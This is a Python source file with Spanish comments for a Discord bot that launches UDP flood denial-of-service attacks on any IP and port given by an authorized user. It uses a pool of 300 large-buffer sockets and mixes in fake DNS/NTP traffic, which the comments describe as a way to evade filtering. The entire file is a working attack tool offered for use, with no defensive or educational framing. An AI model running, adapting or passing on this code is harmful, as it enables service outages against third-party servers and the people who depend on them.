import discord
from discord.ext import commands
import socket
import random
import time
import threading
import asyncio

# Configuración (¡Cambia esto!)
TOKEN = 'TOKEN_DE_TU_BOT'
PREFIX = '$'
authorized_users = ['TU_ID_DISCORD']  # Reemplaza con tu ID

# Variables globales (sin cambios)
attack_in_progress = False
last_attack_time = 0
current_attack_stop_event = None

bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())

# 🔥 Núcleo del UDP Flood (Optimizado para bypass)
async def advanced_udp_flood(ip, port, duration):
    global attack_in_progress
    
    # Configuración avanzada
    payload_sizes = [512, 1024, 1472]  # Variación de tamaños
    sockets = []
    
    # Crear pool de sockets (300 sockets para máxima potencia)
    for _ in range(300):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)  # 16MB buffer
            sockets.append(s)
        except:
            continue
    
    start_time = time.time()
    packets_sent = 0
    
    # Bucle principal (misma potencia, mejor bypass)
    while time.time() < start_time + duration:
        if current_attack_stop_event and current_attack_stop_event.is_set():
            break
            
        for s in sockets:
            try:
                # Técnica de bypass: 30% paquetes legítimos
                if random.random() < 0.3:
                    # Simula tráfico DNS/NTP
                    fake_port = random.choice([53, 123, 443])
                    fake_payload = random._urandom(random.choice([64, 512]))
                    s.sendto(fake_payload, (ip, fake_port))
                else:
                    # Ataque principal (70% tráfico)
                    payload = random._urandom(random.choice(payload_sizes))
                    for _ in range(150):  # 150 envíos por socket
                        s.sendto(payload, (ip, port))
                        packets_sent += 1
            except:
                continue
        
        await asyncio.sleep(0.001)  # Delay mínimo
    
    # Limpieza
    for s in sockets:
        try:
            s.close()
        except:
            pass
    
    return packets_sent

# Comando UDP Flood (mismo formato)
@bot.command(name='udpflood')
async def udp_flood(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time
    
    if str(ctx.author.id) not in authorized_users:
        return await ctx.send("❌ **Acceso denegado**", delete_after=5)
        
    if attack_in_progress:
        return await ctx.send("⚠️ **Ataque en curso**", delete_after=5)
        
    if (time.time() - last_attack_time) < 60:
        return await ctx.send(f"⏳ **Espera {60 - int(time.time() - last_attack_time)}s**", delete_after=5)
        
    if tiempo > 200:
        return await ctx.send("⚠️ **Máximo 200s**", delete_after=5)

    attack_in_progress = True
    embed = discord.Embed(
        title="⚡ **UDP FLOOD INICIADO** ⚡",
        description=f"```\nIP: {ip}\nPuerto: {port}\nDuración: {tiempo}s\n```",
        color=0x00ff00
    )
    msg = await ctx.send(embed=embed)

    try:
        packets = await advanced_udp_flood(ip, port, tiempo)
        pps = packets / tiempo
        
        embed = discord.Embed(
            title="✅ **UDP FLOOD COMPLETADO**",
            description=f"```diff\n+ IP: {ip}:{port}\n+ Paquetes: {packets:,}\n+ PPS: {pps:,.0f}\n```",
            color=0x00ff00
        )
        await msg.edit(embed=embed)

    except Exception as e:
        await msg.edit(content=f"❌ **Error:** `{str(e)}`")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()

# Comando Stop (sin cambios)
@bot.command(name='stop')
async def stop_attack(ctx):
    global current_attack_stop_event
    
    if str(ctx.author.id) not in authorized_users:
        return await ctx.send("❌ **No autorizado**", delete_after=5)
        
    if current_attack_stop_event:
        current_attack_stop_event.set()
        await ctx.send("🛑 **Ataque detenido**")
    else:
        await ctx.send("⚠️ **No hay ataques activos**", delete_after=5)

bot.run(TOKEN)
